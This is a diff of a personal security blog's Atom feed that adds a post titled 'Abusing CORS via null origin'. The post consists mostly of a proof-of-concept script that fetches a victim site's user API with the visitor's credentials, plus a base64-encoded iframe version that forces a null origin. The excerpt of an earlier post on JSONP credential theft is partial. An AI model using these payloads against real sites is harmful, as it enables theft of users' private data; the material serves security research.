@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2018-07-04T00:41:21-07:00</updated><id>http://localhost:4000/</id><title type="html">1hack0.github.io</title><author><name>Richard Cao</name></author><entry><title type="html">Abusing JSONP to grab user credentials</title><link href="http://localhost:4000/2018/07/04/abusing-jsonp-to-grab-user-credentials.html" rel="alternate" type="text/html" title="Abusing JSONP to grab user credentials" /><published>2018-07-04T00:00:00-07:00</published><updated>2018-07-04T00:00:00-07:00</updated><id>http://localhost:4000/2018/07/04/abusing-jsonp-to-grab-user-credentials</id><content type="html" xml:base="http://localhost:4000/2018/07/04/abusing-jsonp-to-grab-user-credentials.html">&lt;p&gt;I find that a company implements cross-domain authentication using JSONP and cookies.There is the login flow:&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2018-07-04T04:30:25-07:00</updated><id>http://localhost:4000/</id><title type="html">1hack0.github.io</title><author><name>Richard Cao</name></author><entry><title type="html">Abusing JSONP to grab user credentials</title><link href="http://localhost:4000/2018/07/04/abusing-jsonp-to-grab-user-credentials.html" rel="alternate" type="text/html" title="Abusing JSONP to grab user credentials" /><published>2018-07-04T00:00:00-07:00</published><updated>2018-07-04T00:00:00-07:00</updated><id>http://localhost:4000/2018/07/04/abusing-jsonp-to-grab-user-credentials</id><content type="html" xml:base="http://localhost:4000/2018/07/04/abusing-jsonp-to-grab-user-credentials.html">&lt;p&gt;I find that a company implements cross-domain authentication using JSONP and cookies.There is the login flow:&lt;/p&gt;
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GET /api/cross/getsign?callback=test HTTP/1.1
 Host: portal.domain.com
 Referer: http://www.otherdomain.com
@@ -37,4 +37,32 @@ function test(data) {
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;Further reading:
-&lt;a href=&quot;https://securitycafe.ro/2017/01/18/practical-jsonp-injection/&quot;&gt;Practical JSONP Injection&lt;/a&gt;&lt;/p&gt;</content><author><name>Richard Cao</name></author><summary type="html">I find that a company implements cross-domain authentication using JSONP and cookies.There is the login flow: ``` GET /api/cross/getsign?callback=test HTTP/1.1 Host: portal.domain.com Referer: http://www.otherdomain.com</summary></entry></feed>
+&lt;a href=&quot;https://securitycafe.ro/2017/01/18/practical-jsonp-injection/&quot;&gt;Practical JSONP Injection&lt;/a&gt;&lt;/p&gt;</content><author><name>Richard Cao</name></author><summary type="html">I find that a company implements cross-domain authentication using JSONP and cookies.There is the login flow: ``` GET /api/cross/getsign?callback=test HTTP/1.1 Host: portal.domain.com Referer: http://www.otherdomain.com</summary></entry><entry><title type="html">Abusing CORS via null origin</title><link href="http://localhost:4000/2018/07/04/abusing-cors-via-null-origin.html" rel="alternate" type="text/html" title="Abusing CORS via null origin" /><published>2018-07-04T00:00:00-07:00</published><updated>2018-07-04T00:00:00-07:00</updated><id>http://localhost:4000/2018/07/04/abusing-cors-via-null-origin</id><content type="html" xml:base="http://localhost:4000/2018/07/04/abusing-cors-via-null-origin.html">&lt;p&gt;&lt;img src=&quot;http://okqza840l.bkt.clouddn.com/20180704165454.png&quot; alt=&quot;&quot; /&gt;
+&lt;img src=&quot;http://okqza840l.bkt.clouddn.com/20180704165532.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;POC:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;script&amp;gt;
+    var url = &quot;https://www.victim.com/api/getuser&quot;;
+    var req = new XMLHttpRequest();
+    req.open('get',url,true);
+    req.setRequestHeader(&quot;Accept&quot;, &quot;application/json&quot;);
+    req.withCredentials = true;
+    req.send();
+    req.onreadystatechange= function(){
+    if(req.readyState == req.DONE) {
+        document.write(this.responseText)
+    }}
+ &amp;lt;/script&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;This code was converted to the equivalent Base64 string.&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;iframe width=100% height=100% src=&quot;data:text/html;base64,PHNjcmlwdD4gdmFyIHVybCA9ICJodHRwczovL3d3dy52aWN0aW0uY29tL2FwaS9nZXR1c2VyIjsgIHZhciByZXEgPSBuZXcgWE1MSHR0cFJlcXVlc3QoKTtyZXEub3BlbignZ2V0Jyx1cmwsdHJ1ZSk7cmVxLnNldFJlcXVlc3RIZWFkZXIoIkFjY2VwdCIsICJhcHBsaWNhdGlvbi9qc29uIik7cmVxLndpdGhDcmVkZW50aWFscyA9IHRydWU7cmVxLnNlbmQoKTtyZXEub25yZWFkeXN0YXRlY2hhbmdlPSBmdW5jdGlvbigpe2lmKHJlcS5yZWFkeVN0YXRlID09IHJlcS5ET05FKSB7ZG9jdW1lbnQud3JpdGUodGhpcy5yZXNwb25zZVRleHQpfSB9PC9zY3JpcHQ+&quot;&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Further reading:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://portswigger.net/blog/exploiting-cors-misconfigurations-for-bitcoins-and-bounties&quot;&gt;Exploiting CORS misconfigurations for Bitcoins and bounties&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.geekboy.ninja/blog/exploiting-misconfigured-cors-cross-origin-resource-sharing/&quot;&gt;Exploiting Misconfigured CORS (Cross Origin Resource Sharing)&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.geekboy.ninja/blog/exploiting-misconfigured-cors-via-wildcard-subdomains&quot;&gt;Exploiting Misconfigured CORS via Wildcard Subdomains&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://web-in-security.blogspot.com/2017/07/cors-misconfigurations-on-large-scale.html&quot;&gt;CORS misconfigurations on a large scale&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://yassineaboukir.com/blog/cors-exploitation-data-exfiltration-when-allowed-origin-is-set-to-null/&quot;&gt;CORS Exploitation: Data exfiltration when allowed origin is set to NULL&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://blog.detectify.com/2018/04/26/cors-misconfigurations-explained/&quot;&gt;CORS Misconfigurations Explained&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;</content><author><name>Richard Cao</name></author><summary type="html"></summary></entry></feed>
